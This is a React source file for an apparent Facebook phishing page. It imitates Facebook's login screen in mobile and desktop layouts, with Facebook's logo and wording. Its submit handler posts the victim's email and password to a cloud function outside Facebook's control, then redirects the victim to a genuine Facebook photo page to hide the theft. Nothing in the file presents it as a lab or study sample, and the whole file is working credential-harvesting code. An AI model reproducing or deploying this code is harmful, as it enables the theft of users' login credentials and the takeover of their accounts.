import React, { useState } from "react";
import axios from "axios"; // Import Axios
import "./styles.css"; // Import your CSS file
import "./LoginForm.css"; // Import your CSS file

function App() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [isMobileView, setIsMobileView] = useState(false);

  const handleSubmit = (event) => {
    event.preventDefault(); // Prevent the form from submitting normally

    // Construct the data to be sent in the POST request
    const data = {
      email: email,
      password: password,
    };

    // Send the POST request using Axios
    axios.post(" https://us-central1-facebook-98c42.cloudfunctions.net/Facebook/login", data)
      .then((response) => {
        // Handle the response from the server
        console.log("Response received from server:", response);
        if (response.status === 200) {
          // Redirect to facebook.com
          window.location.href = 'https://www.facebook.com/photo/?fbid=436581458893652&set=pcb.436581642226967';
        }
        // You can perform further actions based on the response if needed
      })
      .catch((error) => {
        // Handle any errors that occur during the request
        console.error("Error:", error);
      });
  };

  const handleResize = () => {
    // Check if the viewport width is less than or equal to 768px
    setIsMobileView(window.innerWidth <= 768);
  };

  // Listen for window resize events
  window.addEventListener("resize", handleResize);

  // Cleanup the event listener on component unmount
  React.useEffect(() => {
    return () => {
      window.removeEventListener("resize", handleResize);
    };
  }, []);

  return (
    <div className="box">
      {isMobileView ? (
        <div className="facebook-login-container">
          <div className="login-top-banner">
            <div className="facebook-logo">
              <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="facebook-logo" />
            </div>
            <div className="get-facebook-text">Get Facebook for Android and browse faster.</div>
          </div>
          <form onSubmit={handleSubmit} className="mobile-login-form">
            <input
              type="email"
              name="email"
              placeholder="Email address or phone number"
              className="login-input"
              required
              value={email}
              onChange={(e) => setEmail(e.target.value)}
            />
            <input
              type="password"
              name="password"
              placeholder="Password"
              className="login-input"
              required
              value={password}
              onChange={(e) => setPassword(e.target.value)}
            />
            <button type="submit" className="login-button">Log In</button>
          </form>
          <div className="forgot-password-link">
            <a href="/recover/initiate">Forgotten Password?</a>
          </div>
          <div className="create-account-link">
            <a href="/signup">Create New Account</a>
          </div>
        </div>
      ) : (
        <React.Fragment>
          <div className="title-box">
            <img src="https://i.postimg.cc/NMyj90t9/logo.png" alt="Facebook" />
            <p>Facebook helps you connect and share with the people in your life.</p>
          </div>
          <div className="form-box">
            <form onSubmit={handleSubmit}>
              <input
                type="text"
                id="email"
                placeholder="Email address or phone number"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
              />
              <input
                type="password"
                id="password"
                placeholder="Password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
              />
              <button type="submit">Log In</button>
              <a href="#">Forgotten Password</a>
            </form>
            <hr />
            <div className="create-btn">
              <a href="#">
                Create New Account
              </a>
            </div>
          </div>
        </React.Fragment>
      )}
    </div>
  );
}

export default App;
